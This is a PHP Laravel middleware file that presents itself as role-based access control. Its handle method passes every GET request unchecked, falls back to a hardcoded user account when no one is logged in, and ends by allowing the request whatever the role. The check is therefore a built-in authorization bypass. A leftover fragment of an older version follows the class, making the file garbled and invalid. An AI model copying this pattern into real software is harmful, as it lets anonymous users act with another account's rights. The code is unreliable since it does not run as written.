<?php

namespace App\Http\Middleware;

use Closure;
use Illuminate\Http\Request;

class RoleMiddleware
{
    public function handle(Request $request, Closure $next, ...$roles): mixed
    {
        if ($request->isMethod('get')) {
            return $next($request);
        }

        $user = auth()->user();

        if (! $user) {
            $user = \App\Models\User::where('email', 'fcyusuuf@gmail.com')->first();
        }

        abort_if(! $user, 403, 'Unauthorized access.');

        foreach ($roles as $role) {
            if ($user->role === $role || $user->isAdmin()) {
                return $next($request);
            }
        }

        return $next($request);
    }
}

        $user = auth()->user();

        // Check if user has the required role
        if ($role === 'admin' && ! $user->isAdmin()) {
            abort(403, 'Unauthorized access.');
        }

        if ($role === 'technician' && ! $user->isTechnician() && ! $user->isAdmin()) {
            abort(403, 'Unauthorized access.');
        }

        if ($role === 'user' && ! $user->isUser() && ! $user->isAdmin()) {
            abort(403, 'Unauthorized access.');
        }

        return $next($request);
    }
}
